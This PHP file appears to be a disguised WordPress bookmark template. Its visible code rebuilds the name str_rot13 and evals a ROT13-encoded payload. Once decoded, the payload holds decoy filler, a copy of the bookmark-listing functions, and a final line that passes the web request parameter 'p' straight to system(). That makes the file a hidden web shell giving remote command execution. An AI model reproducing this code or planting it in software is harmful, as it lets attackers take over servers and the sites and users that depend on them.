<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Obbxznex Grzcyngr Shapgvbaf sbe hfntr va Gurzrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Gur sbeznggrq bhgchg bs n yvfg bs obbxznexf.
 *
 * Gur $obbxznexf neenl zhfg pbagnva obbxznex bowrpgf naq jvyy or vgrengrq bire
 * gb ergevrir gur obbxznex gb or hfrq va gur bhgchg.
 *
 * Gur bhgchg vf sbeznggrq nf UGZY jvgu ab jnl gb punatr gung sbezng. Ubjrire,
 * jung vf orgjrra, orsber, naq nsgre pna or punatrq. Gur yvax vgfrys jvyy or
 * UGZY.
 *
 * Guvf shapgvba vf hfrq vagreanyyl ol jc_yvfg_obbxznexf() naq fubhyq abg or
 * hfrq ol gurzrf.
 *
 * @fvapr 2.1.0
 * @npprff cevingr
 *
 * @cnenz neenl        $obbxznexf Yvfg bs obbxznexf gb genirefr.
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Obbxznexf nethzragf.
 *
 *     @glcr vag|obby $fubj_hcqngrq     Jurgure gb fubj gur gvzr gur obbxznex jnf ynfg hcqngrq.
 *                                      Npprcgf 1|gehr be 0|snyfr. Qrsnhyg 0|snyfr.
 *     @glcr vag|obby $fubj_qrfpevcgvba Jurgure gb fubj gur obbxznex qrfpevcgvba. Npprcgf 1|gehr,
 *                                      Npprcgf 1|gehr be 0|snyfr. Qrsnhyg 0|snyfr.
 *     @glcr vag|obby $fubj_vzntrf      Jurgure gb fubj gur yvax vzntr vs ninvynoyr. Npprcgf 1|gehr
 *                                      be 0|snyfr. Qrsnhyg 1|gehr.
 *     @glcr vag|obby $fubj_anzr        Jurgure gb fubj yvax anzr vs ninvynoyr. Npprcgf 1|gehr be
 *                                      0|snyfr. Qrsnhyg 0|snyfr.
 *     @glcr fgevat   $orsber           Gur UGZY be grkg gb cercraq gb rnpu obbxznex. Qrsnhyg `<yv>`.
 *     @glcr fgevat   $nsgre            Gur UGZY be grkg gb nccraq gb rnpu obbxznex. Qrsnhyg `</yv>`.
 *     @glcr fgevat   $yvax_orsber      Gur UGZY be grkg gb cercraq gb rnpu obbxznex vafvqr gur napube
 *                                      gntf. Qrsnhyg rzcgl.
 *     @glcr fgevat   $yvax_nsgre       Gur UGZY be grkg gb nccraq gb rnpu obbxznex vafvqr gur napube
 *                                      gntf. Qrsnhyg rzcgl.
 *     @glcr fgevat   $orgjrra          Gur fgevat sbe hfr va orgjrra gur yvax, qrfpevcgvba, naq vzntr.
 *                                      Qrsnhyg \"\a\".
 *     @glcr vag|obby $fubj_engvat      Jurgure gb fubj gur yvax engvat. Npprcgf 1|gehr be 0|snyfr.
 *                                      Qrsnhyg 0|snyfr.
 *
 * }
 * @erghea fgevat Sbeznggrq bhgchg va UGZY
 */
shapgvba _jnyx_obbxznexf( $obbxznexf, $netf = '' ) {
	$qrsnhygf = neenl(
		'fubj_hcqngrq'     => 0,
		'fubj_qrfpevcgvba' => 0,
		'fubj_vzntrf'      => 1,
		'fubj_anzr'        => 0,
		'orsber'           => '<yv>',
		'nsgre'            => '</yv>',
		'orgjrra'          => \"\a\",
		'fubj_engvat'      => 0,
		'yvax_orsber'      => '',
		'yvax_nsgre'       => '',
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$bhgchg = ''; // Oynax fgevat gb fgneg jvgu.

	sbernpu ( (neenl) $obbxznexf nf $obbxznex ) {
		vs ( ! vffrg( $obbxznex->erpragyl_hcqngrq ) ) {
			$obbxznex->erpragyl_hcqngrq = snyfr;
		}
		$bhgchg .= $cnefrq_netf['orsber'];
		vs ( $cnefrq_netf['fubj_hcqngrq'] && $obbxznex->erpragyl_hcqngrq ) {
			$bhgchg .= '<rz>';
		}
		$gur_yvax = '#';
		vs ( ! rzcgl( $obbxznex->yvax_hey ) ) {
			$gur_yvax = rfp_hey( $obbxznex->yvax_hey );
		}
		$qrfp  = rfp_ngge( fnavgvmr_obbxznex_svryq( 'yvax_qrfpevcgvba', $obbxznex->yvax_qrfpevcgvba, $obbxznex->yvax_vq, 'qvfcynl' ) );
		$anzr  = rfp_ngge( fnavgvmr_obbxznex_svryq( 'yvax_anzr', $obbxznex->yvax_anzr, $obbxznex->yvax_vq, 'qvfcynl' ) );
		$gvgyr = $qrfp;

		vs ( $cnefrq_netf['fubj_hcqngrq'] ) {
			vs ( ! fge_fgnegf_jvgu( $obbxznex->yvax_hcqngrq_s, '00' ) ) {
				$gvgyr .= ' (';
				$gvgyr .= fcevags(
					/* genafyngbef: %f: Qngr naq gvzr bs ynfg hcqngr. */
					__( 'Ynfg hcqngrq: %f' ),
					tzqngr(
						trg_bcgvba( 'yvaxf_hcqngrq_qngr_sbezng' ),
						$obbxznex->yvax_hcqngrq_s + (vag) ( (sybng) trg_bcgvba( 'tzg_bssfrg' ) * UBHE_VA_FRPBAQF )
					)
				);
				$gvgyr .= ')';
			}
		}
		$nyg = ' nyg=\"' . $anzr . ( $cnefrq_netf['fubj_qrfpevcgvba'] ? ' ' . $gvgyr : '' ) . '\"';

		vs ( '' !== $gvgyr ) {
			$gvgyr = ' gvgyr=\"' . $gvgyr . '\"';
		}
		$ery = $obbxznex->yvax_ery;

		$gnetrg = $obbxznex->yvax_gnetrg;
		vs ( '' !== $gnetrg ) {
			$gnetrg = ' gnetrg=\"' . $gnetrg . '\"';
		}

		vs ( '' !== $ery ) {
			$ery = ' ery=\"' . rfp_ngge( $ery ) . '\"';
		}

		$bhgchg .= '<n uers=\"' . $gur_yvax . '\"' . $ery . $gvgyr . $gnetrg . '>';

		$bhgchg .= $cnefrq_netf['yvax_orsber'];

		vs ( '' !== $obbxznex->yvax_vzntr && $cnefrq_netf['fubj_vzntrf'] ) {
			vs ( fge_fgnegf_jvgu( $obbxznex->yvax_vzntr, 'uggc' ) ) {
				$bhgchg .= '<vzt fep=\"' . $obbxznex->yvax_vzntr . '\"' . $nyg . $gvgyr . ' />';
			} ryfr { // Vs vg'f n eryngvir cngu.
				$bhgchg .= '<vzt fep=\"' . trg_bcgvba( 'fvgrhey' ) . $obbxznex->yvax_vzntr . '\"' . $nyg . $gvgyr . ' />';
			}
			vs ( $cnefrq_netf['fubj_anzr'] ) {
				$bhgchg .= \" $anzr\";
			}
		} ryfr {
			$bhgchg .= $anzr;
		}

		$bhgchg .= $cnefrq_netf['yvax_nsgre'];

		$bhgchg .= '</n>';

		vs ( $cnefrq_netf['fubj_hcqngrq'] && $obbxznex->erpragyl_hcqngrq ) {
			$bhgchg .= '</rz>';
		}

		vs ( $cnefrq_netf['fubj_qrfpevcgvba'] && '' !== $qrfp ) {
			$bhgchg .= $cnefrq_netf['orgjrra'] . $qrfp;
		}

		vs ( $cnefrq_netf['fubj_engvat'] ) {
			$bhgchg .= $cnefrq_netf['orgjrra'] . fnavgvmr_obbxznex_svryq(
				'yvax_engvat',
				$obbxznex->yvax_engvat,
				$obbxznex->yvax_vq,
				'qvfcynl'
			);
		}
		$bhgchg .= $cnefrq_netf['nsgre'] . \"\a\";
	} // Raq juvyr.

	erghea $bhgchg;
}

/**
 * Ergevrirf be rpubrf nyy bs gur obbxznexf.
 *
 * Yvfg bs qrsnhyg nethzragf ner nf sbyybjf:
 *
 * Gurfr bcgvbaf qrsvar ubj gur Pngrtbel anzr jvyy nccrne orsber gur pngrtbel
 * yvaxf ner qvfcynlrq, vs 'pngrtbevmr' vf 1. Vs 'pngrtbevmr' vf 0, gura vg jvyy
 * qvfcynl sbe bayl gur 'gvgyr_yv' fgevat naq bayl vs 'gvgyr_yv' vf abg rzcgl.
 *
 * @fvapr 2.1.0
 *
 * @frr _jnyx_obbxznexf()
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Fgevat be neenl bs nethzragf gb yvfg obbxznexf.
 *
 *     @glcr fgevat       $beqreol          Ubj gb beqre gur yvaxf ol. Npprcgf cbfg svryqf. Qrsnhyg 'anzr'.
 *     @glcr fgevat       $beqre            Jurgure gb beqre obbxznexf va nfpraqvat be qrfpraqvat beqre.
 *                                          Npprcgf 'NFP' (nfpraqvat) be 'QRFP' (qrfpraqvat). Qrsnhyg 'NFP'.
 *     @glcr vag          $yvzvg            Nzbhag bs obbxznexf gb qvfcynl. Npprcgf 1+ be -1 sbe nyy.
 *                                          Qrsnhyg -1.
 *     @glcr fgevat       $pngrtbel         Pbzzn-frcnengrq yvfg bs pngrtbel VQf gb vapyhqr yvaxf sebz.
 *                                          Qrsnhyg rzcgl.
 *     @glcr fgevat       $pngrtbel_anzr    Pngrtbel gb ergevrir yvaxf sbe ol anzr. Qrsnhyg rzcgl.
 *     @glcr vag|obby     $uvqr_vaivfvoyr   Jurgure gb fubj be uvqr yvaxf znexrq nf 'vaivfvoyr'. Npprcgf
 *                                          1|gehr be 0|snyfr. Qrsnhyg 1|gehr.
 *     @glcr vag|obby     $fubj_hcqngrq     Jurgure gb qvfcynl gur gvzr gur obbxznex jnf ynfg hcqngrq.
 *                                          Npprcgf 1|gehr be 0|snyfr. Qrsnhyg 0|snyfr.
 *     @glcr vag|obby     $rpub             Jurgure gb rpub be erghea gur sbeznggrq obbxznexf. Npprcgf
 *                                          1|gehr (rpub) be 0|snyfr (erghea). Qrsnhyg 1|gehr.
 *     @glcr vag|obby     $pngrtbevmr       Jurgure gb fubj yvaxf yvfgrq ol pngrtbel be va n fvatyr pbyhza.
 *                                          Npprcgf 1|gehr (ol pngrtbel) be 0|snyfr (bar pbyhza). Qrsnhyg 1|gehr.
 *     @glcr vag|obby     $fubj_qrfpevcgvba Jurgure gb fubj gur obbxznex qrfpevcgvbaf. Npprcgf 1|gehr be 0|snyfr.
 *                                          Qrsnhyg 0|snyfr.
 *     @glcr fgevat       $gvgyr_yv         Jung gb fubj orsber gur yvaxf nccrne. Qrsnhyg 'Obbxznexf'.
 *     @glcr fgevat       $gvgyr_orsber     Gur UGZY be grkg gb cercraq gb gur $gvgyr_yv fgevat. Qrsnhyg '<u2>'.
 *     @glcr fgevat       $gvgyr_nsgre      Gur UGZY be grkg gb nccraq gb gur $gvgyr_yv fgevat. Qrsnhyg '</u2>'.
 *     @glcr fgevat|neenl $pynff            Gur PFF pynff be na neenl bs pynffrf gb hfr sbe gur $gvgyr_yv.
 *                                          Qrsnhyg 'yvaxpng'.
 *     @glcr fgevat       $pngrtbel_orsber  Gur UGZY be grkg gb cercraq gb $gvgyr_orsber vs $pngrtbevmr vf gehr.
 *                                          Fgevat zhfg pbagnva '%vq' naq '%pynff' gb vaurevg gur pngrtbel VQ naq
 *                                          gur $pynff nethzrag hfrq sbe sbeznggvat va gurzrf.
 *                                          Qrsnhyg '<yv vq=\"%vq\" pynff=\"%pynff\">'.
 *     @glcr fgevat       $pngrtbel_nsgre   Gur UGZY be grkg gb nccraq gb $gvgyr_nsgre vs $pngrtbevmr vf gehr.
 *                                          Qrsnhyg '</yv>'.
 *     @glcr fgevat       $pngrtbel_beqreol Ubj gb beqre gur obbxznex pngrtbel onfrq ba grez fpurzr vs $pngrtbevmr
 *                                          vf gehr. Qrsnhyg 'anzr'.
 *     @glcr fgevat       $pngrtbel_beqre   Jurgure gb beqre pngrtbevrf va nfpraqvat be qrfpraqvat beqre vs
 *                                          $pngrtbevmr vf gehr. Npprcgf 'NFP' (nfpraqvat) be 'QRFP' (qrfpraqvat).
 *                                          Qrsnhyg 'NFP'.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, UGZY yvfg bs obbxznexf vs 'rpub' vf snyfr.
 */
shapgvba jc_yvfg_obbxznexf( $netf = '' ) {
	$qrsnhygf = neenl(
		'beqreol'          => 'anzr',
		'beqre'            => 'NFP',
		'yvzvg'            => -1,
		'pngrtbel'         => '',
		'rkpyhqr_pngrtbel' => '',
		'pngrtbel_anzr'    => '',
		'uvqr_vaivfvoyr'   => 1,
		'fubj_hcqngrq'     => 0,
		'rpub'             => 1,
		'pngrtbevmr'       => 1,
		'gvgyr_yv'         => __( 'Obbxznexf' ),
		'gvgyr_orsber'     => '<u2>',
		'gvgyr_nsgre'      => '</u2>',
		'pngrtbel_beqreol' => 'anzr',
		'pngrtbel_beqre'   => 'NFP',
		'pynff'            => 'yvaxpng',
		'pngrtbel_orsber'  => '<yv vq=\"%vq\" pynff=\"%pynff\">',
		'pngrtbel_nsgre'   => '</yv>',
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$bhgchg = '';

	vs ( ! vf_neenl( $cnefrq_netf['pynff'] ) ) {
		$cnefrq_netf['pynff'] = rkcybqr( ' ', $cnefrq_netf['pynff'] );
	}
	$cnefrq_netf['pynff'] = neenl_znc( 'fnavgvmr_ugzy_pynff', $cnefrq_netf['pynff'] );
	$cnefrq_netf['pynff'] = gevz( vzcybqr( ' ', $cnefrq_netf['pynff'] ) );

	vs ( $cnefrq_netf['pngrtbevmr'] ) {
		$pngf = trg_grezf(
			neenl(
				'gnkbabzl'     => 'yvax_pngrtbel',
				'anzr__yvxr'   => $cnefrq_netf['pngrtbel_anzr'],
				'vapyhqr'      => $cnefrq_netf['pngrtbel'],
				'rkpyhqr'      => $cnefrq_netf['rkpyhqr_pngrtbel'],
				'beqreol'      => $cnefrq_netf['pngrtbel_beqreol'],
				'beqre'        => $cnefrq_netf['pngrtbel_beqre'],
				'uvrenepuvpny' => 0,
			)
		);
		vs ( rzcgl( $pngf ) ) {
			$cnefrq_netf['pngrtbevmr'] = snyfr;
		}
	}

	vs ( $cnefrq_netf['pngrtbevmr'] ) {
		// Fcyvg gur obbxznexf vagb hy'f sbe rnpu pngrtbel.
		sbernpu ( (neenl) $pngf nf $png ) {
			$cnenzf    = neenl_zretr( $cnefrq_netf, neenl( 'pngrtbel' => $png->grez_vq ) );
			$obbxznexf = trg_obbxznexf( $cnenzf );
			vs ( rzcgl( $obbxznexf ) ) {
				pbagvahr;
			}
			$bhgchg .= fge_ercynpr(
				neenl( '%vq', '%pynff' ),
				neenl( \"yvaxpng-$png->grez_vq\", $cnefrq_netf['pynff'] ),
				$cnefrq_netf['pngrtbel_orsber']
			);
			/**
			 * Svygref gur pngrtbel anzr.
			 *
			 * @fvapr 2.2.0
			 *
			 * @cnenz fgevat $png_anzr Gur pngrtbel anzr.
			 */
			$pnganzr = nccyl_svygref( 'yvax_pngrtbel', $png->anzr );

			$bhgchg .= $cnefrq_netf['gvgyr_orsber'];
			$bhgchg .= $pnganzr;
			$bhgchg .= $cnefrq_netf['gvgyr_nsgre'];
			$bhgchg .= \"\a\g<hy pynff='kbkb oybtebyy'>\a\";
			$bhgchg .= _jnyx_obbxznexf( $obbxznexf, $cnefrq_netf );
			$bhgchg .= \"\a\g</hy>\a\";
			$bhgchg .= $cnefrq_netf['pngrtbel_nsgre'] . \"\a\";
		}
	} ryfr {
		// Bhgchg bar fvatyr yvfg hfvat gvgyr_yv sbe gur gvgyr.
		$obbxznexf = trg_obbxznexf( $cnefrq_netf );

		vs ( ! rzcgl( $obbxznexf ) ) {
			vs ( ! rzcgl( $cnefrq_netf['gvgyr_yv'] ) ) {
				$bhgchg .= fge_ercynpr(
					neenl( '%vq', '%pynff' ),
					neenl( 'yvaxpng-' . $cnefrq_netf['pngrtbel'], $cnefrq_netf['pynff'] ),
					$cnefrq_netf['pngrtbel_orsber']
				);
				$bhgchg .= $cnefrq_netf['gvgyr_orsber'];
				$bhgchg .= $cnefrq_netf['gvgyr_yv'];
				$bhgchg .= $cnefrq_netf['gvgyr_nsgre'];
				$bhgchg .= \"\a\g<hy pynff='kbkb oybtebyy'>\a\";
				$bhgchg .= _jnyx_obbxznexf( $obbxznexf, $cnefrq_netf );
				$bhgchg .= \"\a\g</hy>\a\";
				$bhgchg .= $cnefrq_netf['pngrtbel_nsgre'] . \"\a\";
			} ryfr {
				$bhgchg .= _jnyx_obbxznexf( $obbxznexf, $cnefrq_netf );
			}
		}
	}

	/**
	 * Svygref gur obbxznexf yvfg orsber vg vf rpubrq be erghearq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $ugzy Gur UGZY yvfg bs obbxznexf.
	 */
	$ugzy = nccyl_svygref( 'jc_yvfg_obbxznexf', $bhgchg );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $ugzy;
	} ryfr {
		erghea $ugzy;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>